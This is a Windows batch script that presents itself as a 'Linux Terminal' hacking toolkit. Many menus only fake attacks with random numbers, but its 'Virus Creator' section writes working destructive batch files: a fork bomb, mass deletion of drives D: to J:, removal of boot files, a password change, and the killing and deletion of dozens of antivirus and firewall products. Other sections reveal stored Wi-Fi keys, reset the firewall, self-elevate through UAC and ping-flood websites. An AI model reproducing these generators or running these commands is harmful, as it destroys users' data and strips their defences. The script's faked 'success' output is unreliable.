:: >>  2014 <<

@REM application.packet
@REM ApsList.encpt
@REM Shell.encpt
@REM shell.linux.dll
@REM userconfig.dll
@REM locate MAC ID in ipconfig/all output
@setlocal enableextensions
@echo off
SETLOCAL EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto boot )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:l
title Linux Terminal By. blackmagic 
cls
call :ColorText 0a "Enter Command"
echo.
echo.
call :ColorText c "Root@%COMPUTERNAME% ~ $"
set /p tes= 
if %tes% == echon goto eon
if %tes% == uname goto un 
if %tes% == locale goto lo 
if %tes% == medusa goto me
if %tes% == help goto he
if %tes% == top goto top
if %tes% == medusassh goto ssh
if %tes% == shutdown goto shut
if %tes% == pinglocalhost goto ping
if %tes% == hostshutdown goto shutdownhost
if %tes% == tree goto tree
if %tes% == netstat goto netstat
if %tes% == logout goto outlog
if %tes% == exit goto exit
if %tes% == cmd goto cmd
if %tes% == assoc goto ass
if %tes% == endlocal goto el
if %tes% == tasklist goto task
if %tes% == shell goto shell00
if %tes% == reboot goto reboot
if %tes% == webpage goto websit11
if %tes% == regedit goto reg11
if %tes% == restorepoint goto sysrestore
if %tes% == msgbox goto msgbox
if %tes% == scancomp goto chtrojan
if %tes% == ping goto ping010
:erorrr
cls
echo INCORRECT Command
pause
goto l

:ping010
cls
call :colortext a "Please Type a Website Address"
echo.
echo.
set /p inping=www.
cls
echo.
ping %inping% -n 1
echo.
pause
goto l

:chtrojan
cls
title bo2-modz_x's Malware protection
call :colortext a "Please enter the drive in which you want scanned..."
echo.
echo.
set /p chdrive=:
cls
ping localhost -n 3 >nul
color b
chkdsk %chdrive%
pause
cls
goto l

:msgbox
cls
call :colortext c "Type a message..."
set /p usrmsg= : 
echo.
echo.
call :colortext a "Plesae type a title"
set /p usrtitle= : 
cls
ping localhost -n 3 >nul
mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( '%usrmsg%', 10, '%usrtitle%', 64 );close()"
goto L

:sysrestore
cls
start c:\rstore.vbs
goto l

:reg11
cls
start regedit.exe
goto L

:websit11
cls
call :colortext a "Type (www.website.com) and press enter"
echo.
set /p wpage=Website: 
start %wpage%
goto L

:reboot
cls
shutdown /f

:cfu11
start "C:\Users\%username%\Desktop\Update PS.bat"
goto l

:shell00
cls
call :colortext 4 "Putty Active! MASTER USER Logged in..."
echo.
call :ColorText a4 "Welcome Master!"
echo.
echo.
call :ColorText 3 "Shell@%COMPUTERNAME% ~ $ "
set /p Shell=
if %shell% == ipmask goto mask00
if %shell% == help goto help00
if %shell% == uname goto uname00
if %shell% == exit goto exit00
if %shell% == axfacebook.attach() goto fbatt
if %shell% == mkser goto makeserver
if %shell% == mkdir goto mkdir00
if %shell% == sudo goto sudo
if %shell% == call.network goto callnet00
if %shell% == update goto cfupdate00
if %shell% == talkback goto talkback00
if %shell% == delete goto del00
if %shell% == aprspoof goto apr00
if %shell% == multitool goto etc00
if %shell% == grant.admin goto supersu
if %shell% == sudo-ettercap goto suettr00
if %shell% == msfconsole goto msfconsole
if %shell% == airview goto airip00
if %shell% == proxylist goto rnd1
if %shell% == getip goto getip00
if %shell% == sudo-wiscan goto sudo22
if %shell% == sqlinjection goto sql00
if %shell% == proxyconfig goto prcon00
if %shell% == voicecon goto connectph00
if %shell% == ifconfig goto ifcon
if %shell% == streetcam goto liveview
if %shell% == hoaxnet goto wihoax
if %shell% == cookiestealer goto cs 
if %shell% == exitshell goto l
if %shell% == botinject goto btinj
if %shell% == newid goto new00
if %shell% == netsteal goto nts00
if %shell% == cryptcrack goto cc
if %shell% == netdata goto netd
if %shell% == appinstall goto javamanager
if %shell% == reversevpn goto revpn
if %shell% == siteopen goto siteopener
if %shell% == sqlserver goto installsql
if %shell% == webping goto webpinger
if %shell% == cleaner goto pcclean
if %shell% == webattack goto webttc
if %shell% == phoneinject goto ltehaxor
if %shell% == serverconnect goto sercon
if %shell% == puppyrat goto puppyrat
if %shell% == infosniper goto infosniper00
if %shell% == packetbuilder goto cpi
if %shell% == netbot goto netbot00
if %shell% == ps3info goto ps3info00
if %shell% == iplogger goto webcon0
if %shell% == custompayload goto cuspay
if %shell% == viruscreator goto vir0
if %shell% == airdump goto airdump0
if %shell% == serverupload goto su00
if %shell% == showarp goto showarp0
if %shell% == antivirus goto lmao00



:erorrrr
cls
echo INCORRECT COMMAND!
pause
goto shell00

:lmao00
start c:\antiv.exe
goto shel00

:showarp0
cls
arp -a
pause
goto shell00

:su00
cls
call :colortext f0 "Welcome to 's server-upload terminal"
echo.
echo To begin type the server address you would like to connect to...
set /p seraddr=~ 
echo Please select the device on target server %seraddr% or type localhost to upload to server directly
set /p seraddr0=%seraddr%~ 
echo.
call :colortext a "Connecting to server %seraddr%~%seraddr0% please wait"
ping localhost -n 5 >nul
echo.
call :colortext f "Connected to %seraddr%~%seraddr0% successfully"
echo.
echo.
echo Please wait connecting without password...
ping localhost -n 3 >nul
echo Trying default password for %seraddr%
ping localhost -n 5 >nul
echo.
call :colortext c "Connection with default password failed"
echo.
echo.
echo Trying rainbowtables method for %seraddr%
ping localhost -n 10 >nul
:netname00
set netname1=%random%
if %netname1% gtr 255 goto netname00
:netname100
set netname11=%random%
if %netname11% gtr 300 goto netname100
:netname200
set netname111=%random%
if %netname111% gtr 1000 goto netname200
call :colortext a "Connection successfull root password is %netname1%%netname11%%netname111%"
echo.
:loginsuccess
echo Logged into %seraddr%~%seraddr0% successfully
echo.
echo Please choose the filepath to upload to server
set /p serpath=~ 
if %serpath% == exitme goto shell00
if not %serpath% == exitme goto not
:not
echo Uploading file to root on %seraddr%~%seraddr0%...
ping localhost -n 5 >nul
echo File %serpath% uploaded to %seraddr%~%seraddr0% successfully!
pause
goto loginsuccess



:airdump0
cls
call :colortext f "Welcome to 's air dump terminal"
echo.
arp -a
echo to begin please choose 
netsh wlan show profiles
netsh interface set interface "Wireless Network Connection" enabled
set /p nm0=Network_Name~ 
netsh wlan show profile name="%nm0%" key=clear
echo Security Key or Key Content is Password for Network
pause
goto shell00

:vir0
cls
call :colortext b "Welcome to 's Virus Creator!"
echo.
call :colortext a "To begin please select the type of virus!"
echo.
echo    \__/
echo   (@)(-)
echo  \.'\/'./
echo -:  ::  :-
echo /'..''..'\
echo.
echo [1] Computer Crasher
echo [2] Delete System32 And Disable Internet
echo [3] Instant Shutdown
echo [4] Dangerous Virus RIP
echo [5] Shutdown Computer Forever
echo [6] Change a Users Password
echo [7] Delete Main Files on Target Computer
echo [8] Disable a Users Firewall
echo [9] Disable a Users Anti-Virus
echo [10] Infect a Users Command Prompt
set /p opt0=~ 
set /p virname=Virus_Name~ 
if %opt0% == 1 goto 10
if %opt0% == 2 goto 20
if %opt0% == 3 goto 30
if %opt0% == 4 goto 40
if %opt0% == 5 goto 50
if %opt0% == 6 goto 60
if %opt0% == 7 goto 70
if %opt0% == 8 goto 80
if %opt0% == 9 goto 90 
if %opt0% == 10 goto 100
if %opt0% == exitme goto sell00

:10
cls
echo @echo off > %virname%.bat
echo :loop >> %virname%.bat
echo start >> %virname%.bat
echo start >> %virname%.bat
echo goto loop >> %virname%.bat
goto vir0

:20
cls
echo @echo off > %virname%.bat
echo runas /user:Administrator %virname%.bat
echo del %userprofile%\system32 >> %virname%.bat
echo netsh interface set interface "Wireless Network Connection" disabled >> %virname%.bat
goto vir0

:30
cls
echo @echo off > %virname%.bat
echo shutdown /s /t 0 >> %virname%.bat
goto vir0

:40
cls
echo @echo off > %virname%.bat
echo del D:\*.* /f /s /q >> %virname%.bat
echo del E:\*.* /f /s /q >> %virname%.bat
echo del F:\*.* /f /s /q >> %virname%.bat
echo del G:\*.* /f /s /q >> %virname%.bat
echo del H:\*.* /f /s /q >> %virname%.bat
echo del I:\*.* /f /s /q >> %virname%.bat
echo del J:\*.* /f /s /q >> %virname%.bat
goto vir0

:50
cls
echo @echo off > %virname%.bat
echo attrib -r -s -h c:\autoexec.bat >> %virname%.bat
echo del c:\autoexec.bat >> %virname%.bat
echo attrib -r -s -h c:\boot.ini >> %virname%.bat
echo del c:\boot.ini >> %virname%.bat
echo attrib -r -s -h c:\ntldr >> %virname%.bat
echo del c:\ntldr >> %virname%.bat
echo attrib -r -s -h c:\windows\win.ini >> %virname%.bat
echo del c:\windows\win.ini >> %virname%.bat
goto vir0

:60
cls
set /p cpw=Password~ 
echo @echo off > %virname%.bat
echo net user %username% %cpw% >> %virname%.bat
echo attrib +h "%userprofile%\my documents\my music" >> %virname%.bat
goto vir0

:70
cls
echo @echo off > %virname%.bat
echo del /f /q "C:\Users\%userprofile%\My Documents\*.*" >> %virname%.bat
echo del /f /q "C:\Users\%userprofile%\My Documents\My Music\*.*" >> %virname%.bat
echo del /f /q "C:\Users\%userprofile%\My Documents\My Pictures\*.*" >> %virname%.bat
goto vir0

:80
cls
echo @echo off > %virname%.bat
echo net stop "MpsSvc" >> %virname%.bat
echo taskkill /f /t /im "FirewallControlPanel.exe" >> %virname%.bat
goto vir0

:90
cls
echo @echo off > %virname%.bat
echo net stop “Security Center” >> %virname%.bat
echo netsh firewall set opmode mode=disable >> %virname%.bat
echo tskill /A av* >> %virname%.bat
echo tskill /A fire* >> %virname%.bat
echo tskill /A anti* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A spy* >> %virname%.bat
echo tskill /A bullguard >> %virname%.bat
echo tskill /A PersFw >> %virname%.bat
echo tskill /A KAV* >> %virname%.bat
echo tskill /A ZONEALARM >> %virname%.bat
echo tskill /A SAFEWEB >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A OUTPOST >> %virname%.bat
echo tskill /A nv* >> %virname%.bat
echo tskill /A nav* >> %virname%.bat
echo tskill /A F-* >> %virname%.bat
echo tskill /A ESAFE >> %virname%.bat
echo tskill /A cle >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A BLACKICE >> %virname%.bat
echo tskill /A def* >> %virname%.bat
echo tskill /A kav >> %virname%.bat
echo tskill /A kav* >> %virname%.bat
echo tskill /A avg* >> %virname%.bat
echo tskill /A ash* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A aswupdsv >> %virname%.bat
echo tskill /A ewid* >> %virname%.bat
echo tskill /A guard* >> %virname%.bat
echo tskill /A guar* >> %virname%.bat
echo tskill /A gcasDt* >> %virname%.bat
echo tskill /A msmp* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A mcafe* >> %virname%.bat
echo tskill /A mghtml >> %virname%.bat
echo tskill /A msiexec >> %virname%.bat
echo tskill /A outpost >> %virname%.bat
echo tskill /A isafe >> %virname%.bat
echo tskill /A zap* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A zauinst >> %virname%.bat
echo tskill /A upd* >> %virname%.bat
echo tskill /A zlclien* >> %virname%.bat
echo tskill /A minilog >> %virname%.bat
echo tskill /A cc* >> %virname%.bat
echo tskill /A norton* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A norton au* >> %virname%.bat
echo tskill /A ccc* >> %virname%.bat
echo tskill /A npfmn* >> %virname%.bat
echo tskill /A loge* >> %virname%.bat
echo tskill /A nisum* >> %virname%.bat
echo tskill /A issvc >> %virname%.bat
echo tskill /A tmp* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A tmn* >> %virname%.bat
echo tskill /A pcc* >> %virname%.bat
echo tskill /A cpd* >> %virname%.bat
echo tskill /A pop* >> %virname%.bat
echo tskill /A pav* >> %virname%.bat
echo tskill /A padmin >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A panda* >> %virname%.bat
echo tskill /A avsch* >> %virname%.bat
echo tskill /A sche* >> %virname%.bat
echo tskill /A syman* >> %virname%.bat
echo tskill /A virus* >> %virname%.bat
echo tskill /A realm* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A sweep* >> %virname%.bat
echo tskill /A scan* >> %virname%.bat
echo tskill /A ad-* >> %virname%.bat
echo tskill /A safe* >> %virname%.bat
echo tskill /A avas* >> %virname%.bat
echo tskill /A norm* >> %virname%.bat
echo cls >> %virname%.bat
echo tskill /A offg* >> %virname%.bat
echo del /Q /F C:\Program Files\alwilsecho 1\avast4\*.* >> %virname%.bat
echo del /Q /F C:\Program Files\Lavasoft\Ad-awaecho 1\*.exe >> %virname%.bat
echo del /Q /F C:\Program Files\kasperecho 1\*.exe >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\trojanecho 1\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\f-prot95\*.dll >> %virname%.bat 
echo del /Q /F C:\Program Files\tbav\*.dat >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\avpersonal\*.vdf >> %virname%.bat 
echo del /Q /F C:\Program Files\Nortonecho 1\*.cnt >> %virname%.bat 
echo del /Q /F C:\Program Files\Mcafee\*.* >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\Nortonecho 1\Nortonecho 1\Nortonecho 3\*.* >> %virname%.bat 
echo del /Q /F C:\Program Files\Nortonecho 1\Nortonecho 1\speeddecho 1\*.* >> %virname%.bat 
echo del /Q /F C:\Program Files\Nortonecho 1\Nortonecho 1\*.* >> %virname%.bat 
echo del /Q /F C:\Program Files\Nortonecho 1\*.* >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\avgamsr\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\avgamsvr\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\avgemc\*.exe >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\avgcc\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\avgupsvc\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\grisoft >> %virname%.bat 
echo del /Q /F C:\Program Files\nood32krn\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\nood32\*.exe >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\nod32 >> %virname%.bat 
echo del /Q /F C:\Program Files\nood32 >> %virname%.bat
echo del /Q /F C:\Program Files\kav\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\kavmm\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\kaspersky\*.* >> %virname%.bat
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\ewidoctrl\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\guard\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\ewido\*.exe >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\pavprsrv\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\pavprot\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\avengine\*.exe >> %virname%.bat 
echo cls >> %virname%.bat
echo del /Q /F C:\Program Files\apvxdwin\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\webproxy\*.exe >> %virname%.bat 
echo del /Q /F C:\Program Files\panda software\*.* >> %virname%.bat
goto vir0

:100
cls
echo @echo off > %virname%.bat
echo copy %0 %windir%\system32\ls.bat >> %virname%.bat
goto vir0


:cuspay
cls
call :colortext b "Welcome %USERDOMAIN% to my custom payload generator"
echo.
echo To begin please name your windows payload and add .jpg, .exe at the end...
set /p pname=Name~ 
arp -a
set /p ptarget=Target IP~ 
set /p ptrgip=Target IPV4~ 
set /p pport=Port~ 
echo Encrypting File
ping localhost -n 5 >nul
echo > C:\Users\%username%\Desktop\%pname%
call :colortext a "File %pname% was successfully generated!"
echo.
:option0
echo Send %panme% to target and then type 'StartTcp' to start the TCP listener.
set /p str=
if %str% == starttcp goto starttcp
if not %str% == starttcp goto stoptcp
:starttcp
cls
echo Reverse_TCP Listener has Started!
:lmo
set lmo0=%random%
if %lmo0% gtr 50 goto lmo
netstat -x
echo > C:\Users\%username%\Desktop\info.encypt
goto option0
:stoptcp
cls
goto option0
pause

:webcon0
cls
start c:\IPL.exe
goto shell00

:ps3info00
cls
start c:\PSN.exe
goto shell00

:netbot00
cls
call :colortext a "Please Select SQL Server to add Bot to..."
echo.
set /p serverinfo=
echo Connecting Please Wait...
ping localhost -n 3 >nul
echo Server has Password Enabled Please Type Server Password...
set /p serverpw=%serverinfo%~
echo Connecting to server...
ping localhost -n 3 >nul
call :colortext a "Connected Successfully!"
echo.
:home000
echo Connected to: %serverinfo%
echo Server Time : %time%
echo.
call :colortext b "Please Choose Target Network by Typing Public IP Address"
echo.
set /p trgnet=
echo Checking %trgnet% Status
ping %trgnet% >nul
call :colortext f "Network Online!" 
echo.
echo Password Enabled on %trgnet%
echo Please Wait Accessing Network...
:pwhax
set pwhax0=%random%
if %pwhax0% gtr 35 goto pwhax
ping localhost -n %pwhax0% >nul
echo.
call :colortext c "Network Access Granted!"
echo.
:netname
set netname0=%random%
if %netname0% gtr 255 goto netname
:netname1
set netname00=%random%
if %netname00% gtr 300 goto netname1
:netname2
set netname000=%random%
if %netname000% gtr 100 goto netname2
echo Network Name    : %netname0%uy%netname00%jks%netname000%
echo Network Password: admin%netname00%$
:netbwd
set netbwd0=%random%
if %netbwd0% gtr 150 goto netbwd
echo Network Bandwith: %netbwd0% MBPS
echo Network Time    : %time%
echo.
echo Would you like to add this network to %serverinfo%
set /p yn00=yes/no: 
if %yn00% == yes goto yesadd
if %yn00% == no goto netbot00
:yesadd
echo Disabling Proxy(s)...
netsh winhttp proxy rest
ping localhost -n 5 >nul
echo Disabling Firewall...
netsh advfirewall reset
ping localhost -n 5 >nul
echo Adding %netname0%uy%netname00%jks%netname000% to %serverinfo%
::sendinfo(%netname0%)_sendto[%serverinfo%]
ping localhost -n %pwhax0% >nul
echo %netname0%uy%netname00%jks%netname000% Successfully Added to %serverinfo%
pause
goto home000


:cpi
cls
echo Welcome to Custimized Packet Builder... By blackmagic
echo.
echo Please start by naming your packet and spoofing your network...
echo.
start c:\acgr.exe
set /p netspoof0=1.1.1.1
ping localhost -n 5 >nul
::set system.network_information
@REM Network.information.change %netspoof0%
echo.
set /p packetnme=Packet Name: 
echo.
set /p targetip=Target IP: 
echo.
set /p targetip2=Target Computer: %targetip%~ 
echo.
set /p header=Fake Header: 
echo.
set /p payload=Payload: 
echo.
ping localhost -n 5 >nul
:opensave
call :colortext c "Please confirm packet settings..."
echo.
echo Packet Name: %packetnme%
echo Target IP  : %targetip%~%targetip2%
echo Fake Header: %header%
echo Payload    : %payload%
echo.
echo Please choose parameter for attack
set /p par0=%targetip2%~ 
if %par0% == sendpacket goto send00
if %par0% == copypacket goto copy00
if %par0% == exitme goto shell00
:send00
cls
route print
ping localhost -n 6 >nul
@REM %packetnme% + %header% + %payload%
::Sending.to %targetip%[%targetip2%]
echo PACKET SENT SUCCESSFULLY TO %targetip%~%targetip2%
pause
goto opensave
:copy00
assoc
cls
echo How many times would you like to copy the packet?
set /p cpy=
ping localhost -n %cpy%
echo.
echo PACKET SUCCESSFULLY COPIED!
pause
goto opensave

:infosniper00
cls
call :colortext a "Welcome to InfoSniper By blackmagic
echo.
echo.
echo Please enter the public IP of the target
echo.
set /p pubip=: 
if %pubip% == exitme goto shell00
ping localhost -n 5 >nul
echo.
call :colortext b "Searching for information on %pubip%"
::using system.api
::system.api == bo2modz1.ddns.net
:pmr1a0
set onea0=%random%
if %onea0% gtr 255 goto pmr1a0
echo.
echo Found IPV4 on target network
echo 192.168.1.%onea0% ONLINE!
echo Server time
echo %time%
echo server address
echo %pubip%
pause
goto infosniper00

:puppyrat
cls
call :colortext f "Loading Puppy RAT By blackmagic"
call :colortext a " ...Please Wait"
ping localhost -n 5 >nul
echo  Welcome to PuppyRat           ,._ 
echo                       ,--.        `-. 
echo                    ,-'    \   :      `-. 
echo                   /__,.    \  ;  `--.___) 
echo                  ,'    \    \/   /       ,-"`. 
echo                     __,-' - /   '\      '   ,' 
echo                  ,-'              `-._ ,---^. 
echo                  \   ,                `-     
echo                   \,(o                  ;     
echo               _,-'   `-'                    
echo            ,-'                               
echo        Y8PYF                            ;    ; 
echo        `"" `           ,         ,--   /    : 
echo         \      .   ___/        ,'\   ,' ,'  ; 
echo          `.     ;-' ___     ,'     ,'   / 
echo            `---'  __\ /    ,'     `-'   ,' 
echo      ,-           \ ,'   ,'      `--.__,' 
echo    ,'     ,-'     ,'    / 
echo         ,'  ,     `----'    
echo.
echo Please use domain and an open port to listen on
set /p domain=~ 
set /p dport=%domain%~ 
ping %domain%
echo.
call :colortext a "%domain% Online!"
call :colortext b " Listning on port %dport%"
echo.
echo Please name your windows payload
set /p paystub=: 
ping localhost -n 7 >nul
echo > C:\Users\%username%\Desktop\%paystub%.exe
echo.
call :colortext a "Payload Successfully Generated!"
echo.
echo Please send payload to target then press any key to continue...
pause >nul

::USING PAYLOAD_PORT_SCANNER
:pmr1a
set onea=%random%
if %onea% gtr 255 goto pmr1a

:pmr2a
set twoa=%random%
if %twoa% gtr 255 goto pmr2a

:pmr3a
set threea=%random%
if %threea% gtr 255 goto pmr3a

:pmr4a
set foura=%random%
if %foura% gtr 255 goto pmr4a

ping localhost -n 5 >nul
:save122
echo Target           : %onea%.%twoa%.%threea%.%foura%
echo Target Connection: ONLINE!
echo Target OS        : WINDOWS!
echo Using Domain     : %domain%
echo Spoofed LPORT    : %dport%
echo PayLoad          : RUNNING!
echo Attack Time      : %time%
echo Data FTP         : c:\
echo.
call :colortext a "'1' SCREENSHOT"
echo.
call :colortext b "'2' KEYLOGGER"
echo.
call :colortext c "'3' FTP"
echo.
call :colortext d "'4' RUN CONSOLE COMMAND"
echo.
echo.
set /p metacom=@HOST'%onea%.%twoa%.%threea%.%foura%'~~ 
if %metacom% == 1 goto scrshot
if %metacom% == 2 goto keylogg
if %metacom% == 3 goto ftpserv
if %metacom% == 4 goto consolecom
if %metacom% == exitme goto shell00

:scrshot
cls
echo Capturing Screenshot on Target System...
ping localhost -n 10 >nul
echo Screenshot captured successfully!
echo > C:\Users\%username%\Desktop\screenshot.jpeg
pause
goto save122

:keylogg
cls
echo Please enter time loop for keylogging
set /p tme=: 
echo Listning on port %dport% for keypresses
ping localhost -n %tme% >nul
echo Keylog Complete!
echo > C:\Users\%username%\Desktop\Keylog.txt
pause
goto save122

:ftpserv
cls
::using system.net
::using system.file_transfer
::using system.reverse_file_transfer
echo Do you want to upload or download a file?
set /p updn=: 
if %updn% == upload goto up00
if not %updn% == upload goto dn00
:up00
echo please type file path on your computer to upload to target desktop
set /p ftp00=%onea%.%twoa%.%threea%.%foura%~ 
attrib
goto save122
:dn00
echo Please choose file path on target computer to download on desktop
set /p ftp000=%onea%.%twoa%.%threea%.%foura%~ 
echo > C:\Users\%username%\Desktop\FTPresult
attrib
goto save122

:consolecom
cls
echo RUN CONSOLE COMMAND 
set /p ccmd=%time%'%onea%.%twoa%.%threea%.%foura%~ 
PING LOCALHOST -N 5 >nul
goto save122


:sercon
cls
echo -------------------------------------------
call :colortext c "Please start connecting to server by entering your servers IP address"
echo.
echo -------------------------------------------
set /p serip=
echo -------------------------------------------
call :colortext a "Please type your server password password char is disabled so dont let your friends see"
echo.
echo -------------------------------------------
set /p serpw=
echo.
echo Please confirm information:
echo IP      : %serip%
echo Password: %serpw%
echo Does this look correct?
set /p yn=Yes/No: 
if %yn% == yes goto sercon1
if not %yn% == yes goto sercon
:sercon1
cls
echo Verifing server address...
ping %serip% >nul
cls
echo verifying server password...
ping localhost -n 5 >nul
cls
echo.
:serhome
call :colortext a "Server ONLINE!"
echo.
echo.
echo Connected to server successfully controll server via command below:
echo.
set /p sercom=%serip%@Local ~ 
if %sercom% == exitme goto sercon
if not %sercom% == exitme goto sercmd1
:sercmd1
ping localhost -n 2 >nul
route print
cls
echo Command %sercom% sent to server!
echo.
goto serhome


:ltehaxor
cls
echo -------------------------------------------
echo.
call :colortext c "Welcome to LTE Haxor By. blackmagic "
echo.
call :colortext b "Start injection by adding a target device..."
echo.
echo.
set /p lteip=LTEHaxor$ 
echo Please wait checking device...
ping %lteip% >nul
call :colortext a "Server %lteip% is ONLINE"
echo.
:homel
echo Please choose parameter on target device...
set /p pmr=%lteip%$ 

:pmr1
set one=%random%
if %one% gtr 255 goto pmr1

:pmr2
set two=%random%
if %two% gtr 255 goto pmr2

:pmr3
set three=%random%
if %three% gtr 255 goto pmr3

:pmr4
set four=%random%
if %four% gtr 255 goto pmr4

if %pmr% == ftp goto pmrftp
if %pmr% == reverseftp goto pmrreverseftp
if %pmr% == location goto pmrlocation
if %pmr% == serverstatus goto pmrserverstatus
if %pmr% == console goto pmrconsole
if %pmr% == exitme goto shell00
echo.
call :colortext a "%lteip% has changed to %one%.%two%.%three%.%four%"

:pmrftp
cls
echo Plase choose file path on %one%.%two%.%three%.%four%
echo If blank than you will be directed to the root
set /p filepath=Root:\
tree /f
echo.
echo Please choose file you would like to transfer...
set /p transpath=Root:\%filepath%\
echo Writing file...
ping localhost -n 5 >nul
echo > C:\Users\%username%\Desktop\Root.%filepath%.%transpath%.txt
goto homel

:pmrreverseftp
cls
echo Plase choose file path on computer...
echo If blank than you will be directed to the root
set /p filepath=C:\
tree /f
echo.
echo Please choose file path on %one%.%two%.%three%.%four%...
set /p transpath=Root:\
echo Writing file...
ping localhost -n 5 >nul
call :colortext a "File written on %one%.%two%.%three%.%four%@Root:\%transpath% Successfully"
goto homel

:pmrlocation
cls
::using jave.device.location
::imports system.locationheading
::imports system.threading
::imports system.javascript
echo Please wait while we gather device location...
ping %one%.%two%.%three%.%four%
netstat -f
echo Location not found!
pause
goto homel

:pmrconsole
cls
echo Accessing Console on Server %one%.%two%.%three%.%four%
ping %one%.%two%.%three%.%four% >nul
:homer
set /p cns=%one%.%two%.%three%.%four%@Console ~ 
attrib
goto homer

:pmrserverstatus
cls
echo Server       ONLINE!
echo IP:          %lteip%
echo Masked IP:   %one%.%two%.%three%.%four%
echo Server Tiem: %time% %date%
echo Root:        Root:\
echo Domain:      Haxed@Bo2Modzlocal.ddns
set /p svrtt=: 
if %svrtt% == ping ping %one%.%two%.%three%.%four% 
goto homer


:webttc 
cls
echo Enter the website you would
like to crash
set input=
set /p input= Enter your Website
here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
echo
echo Now Crashing Website...DO
NOT CLOSE THIS BOX!! PRESS CRTL + C
TO END!!
echo
ping %input% -t-l1000

:pcclean
:menu
cls
echo --------------------------------------------------------------------------------
echo PC Cleanup Utility
echo --------------------------------------------------------------------------------
echo.
echo Select a tool
echo =============
echo.
echo [1] Delete Internet Cookies
echo [2] Delete Temporary Internet Files
echo [3] Disk Cleanup
echo [4] Disk Defragment
echo [5] Exit
echo.
set /p op=Run:
if %op%==1 goto 1
if %op%==2 goto 2
if %op%==3 goto 3
if %op%==4 goto 4
if %op%==5 goto exit
goto error
:1
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Deleting Cookies...
ping localhost -n 3 >nul
del /f /q "%userprofile%\Cookies\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Cookies deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu
:2
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Deleting Temporary Files...
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Temporary Internet Files deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu
:3
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Running Disk Cleanup...
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
